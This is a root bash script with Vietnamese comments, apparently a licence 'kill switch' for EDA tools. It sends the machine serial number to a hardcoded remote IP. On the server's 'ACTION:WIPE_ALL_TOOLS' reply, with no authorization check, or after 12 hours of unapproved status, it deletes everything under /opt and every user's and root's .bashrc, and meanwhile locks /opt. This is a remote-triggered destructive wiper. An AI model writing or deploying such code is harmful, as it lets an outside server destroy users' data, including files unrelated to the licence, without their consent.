#!/bin/bash

# Bắt buộc chạy bằng quyền root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root." >&2
    exit 1
fi

# ------------------ 0. CHỐNG CHẠY CHỒNG (FLOCK LOCKING) ------------------
exec 9>/run/eda-control.lock
flock -n 9 || exit 0

# ------------------ THƯ MỤC TRẠNG THÁI BẢO MẬT ------------------
STATE_DIR="/var/lib/eda-control"
STATUS_FILE="$STATE_DIR/status.txt"
FIRST_FAIL_FILE="$STATE_DIR/first_fail.timestamp"

mkdir -p "$STATE_DIR"
chown root:root "$STATE_DIR"
chmod 700 "$STATE_DIR"

TOOL_DIR_1="/opt"
VPS_URL="http://13.214.142.47:8888"

# ------------------ HÀM TIÊU HỦY DỮ LIỆU CÓ VERIFY TOÀN DIỆN ------------------
do_wipe_system() {
    [ -d "$TOOL_DIR_1" ] && chmod 755 "$TOOL_DIR_1" 2>/dev/null
    
    # Gỡ immutable từ tầng sâu nhất lên nông
    find "$TOOL_DIR_1" -mindepth 1 -depth -exec chattr -i {} + 2>/dev/null
    
    # 1. Xóa sạch gốc rễ thư mục /opt
    rm -rf "$TOOL_DIR_1"/{*,.[!.]*,..?*} 2>/dev/null
    find "$TOOL_DIR_1" -mindepth 1 -delete 2>/dev/null
    
    # 2. Xóa sạch .bashrc của root và tất cả user
    chattr -i /root/.bashrc /home/*/.bashrc 2>/dev/null
    rm -f /root/.bashrc /home/*/.bashrc

    # 3. VERIFY 1: Kiểm tra thư mục /opt đã rỗng chưa
    if [ -d "$TOOL_DIR_1" ] && [ "$(ls -A "$TOOL_DIR_1" 2>/dev/null)" ]; then
        echo "Error: Wipe failed - /opt still contains files." >&2
        return 1
    fi

    # 4. VERIFY 2: Kiểm tra các file .bashrc đã bị xóa hoàn toàn chưa
    if [ -f /root/.bashrc ]; then
        echo "Error: Wipe failed - /root/.bashrc still exists." >&2
        return 1
    fi

    for user_bashrc in /home/*/.bashrc; do
        if [ -f "$user_bashrc" ]; then
            echo "Error: Wipe failed - $user_bashrc still exists." >&2
            return 1
        fi
    done

    # 5. CHỈ DỌN DẸP TIMESTAMP KHI TẤT CẢ VERIFY ĐỀU THÀNH CÔNG
    rm -f "$FIRST_FAIL_FILE"

    return 0
}

# ------------------ 1. KIỂM TRA SERIAL ------------------
SERIAL=$(/usr/sbin/dmidecode -s system-serial-number 2>/dev/null | tr -d '\r\n')

if [ -z "$SERIAL" ]; then
    echo "Error: Unable to retrieve system serial number." >&2
    exit 1
fi

# ------------------ 2. PRIORITY CHECK: KIỂM TRA LỆNH WIPE CHỦ ĐỘNG TRƯỚC ------------------
WIPE_RESP=""
if WIPE_RESP=$(curl -fsS \
    --connect-timeout 5 \
    --max-time 10 \
    -G \
    --data-urlencode "serial=$SERIAL" \
    --data-urlencode "action=check_wipe" \
    "${VPS_URL}/report_12h" 2>/dev/null); then

    WIPE_RESP=$(printf '%s' "$WIPE_RESP" | tr -d '\r\n')

    # 🚨 LỆNH WIPE CÓ UY QUYỀN CAO NHẤT: THỰC THI NGAY KHÔNG CẦN CHECK AUTHORIZATION
    if [ "$WIPE_RESP" = "ACTION:WIPE_ALL_TOOLS" ]; then
        if do_wipe_system; then
            curl -fsS --connect-timeout 5 --max-time 10 -G \
                 --data-urlencode "serial=$SERIAL" \
                 --data-urlencode "status=active_wipe_confirmed" \
                 "${VPS_URL}/report_12h" >/dev/null 2>&1 || true
            exit 0
        else
            echo "Active wipe failed. Will retry on next check." >&2
            exit 1
        fi
    fi
fi

# ------------------ 3. CHECK AUTHORIZATION LICENSE (REQUEST 1) ------------------
if ! RESPONSE_STATUS=$(curl -fsS \
    --connect-timeout 5 \
    --max-time 10 \
    -G \
    --data-urlencode "serial=$SERIAL" \
    "${VPS_URL}/"); then
    echo "VPS status request failed; keeping current state" >&2
    exit 1
fi

printf '%s\n' "$RESPONSE_STATUS" > "$STATUS_FILE"
chmod 600 "$STATUS_FILE"

# ------------------ 4. STRICT MATCHING DÒNG ĐẦU ------------------
FIRST_LINE=$(printf '%s\n' "$RESPONSE_STATUS" | head -n1 | tr -d '\r')

AUTH_STATE=""
case "$FIRST_LINE" in
    AUTHORIZED)
        AUTH_STATE="approved"
        ;;
    "You are not approved"*)
        AUTH_STATE="unapproved"
        ;;
    *)
        echo "Unknown VPS response format; keeping current state" >&2
        exit 1
        ;;
esac

# ------------------ 5. XỬ LÝ THEO TRẠNG THÁI APPROVED / UNAPPROVED ------------------
if [ "$AUTH_STATE" = "unapproved" ]; then

    SERVER_TIME=$(
        printf '%s\n' "$RESPONSE_STATUS" |
        grep -m1 -o 'SERVER_TIME:[0-9]\+' |
        cut -d':' -f2
    )

    if [[ "$SERVER_TIME" =~ ^[0-9]+$ ]]; then
        
        if [ ! -f "$FIRST_FAIL_FILE" ]; then
            echo "$SERVER_TIME" > "$FIRST_FAIL_FILE"
            chmod 600 "$FIRST_FAIL_FILE"
        fi

        START_TIME=$(cat "$FIRST_FAIL_FILE" 2>/dev/null | tr -d '\r\n')
        
        if [[ "$START_TIME" =~ ^[0-9]+$ ]] && [ "$SERVER_TIME" -ge "$START_TIME" ]; then
            ELAPSED=$((SERVER_TIME - START_TIME))

            # 🚨 UNAPPROVED QUÁ 12 GIỜ (43200 giây) -> TỰ DỌN DẸP
            if [ "$ELAPSED" -ge 43200 ]; then
                if do_wipe_system; then
                    curl -fsS --connect-timeout 5 --max-time 10 -G \
                         --data-urlencode "serial=$SERIAL" \
                         --data-urlencode "status=12h_expired_wiped" \
                         "${VPS_URL}/report_12h" >/dev/null 2>&1 || true
                    exit 0
                else
                    echo "12h expiration wipe failed. Retrying on next check..." >&2
                    [ -d "$TOOL_DIR_1" ] && chmod 000 "$TOOL_DIR_1" 2>/dev/null
                    exit 1
                fi
            fi
        fi
    fi

    # 🔒 Khóa /opt trong lúc chờ phạt 12 tiếng
    [ -d "$TOOL_DIR_1" ] && chmod 000 "$TOOL_DIR_1" 2>/dev/null

else
    # 🔓 Mở khóa /opt khi được cấp phép
    [ -d "$TOOL_DIR_1" ] && chmod 711 "$TOOL_DIR_1" 2>/dev/null

    # Reset lại timestamp phạt khi khôi phục trạng thái thành công
    if [ -f "$FIRST_FAIL_FILE" ]; then
        rm -f "$FIRST_FAIL_FILE"
    fi
fi
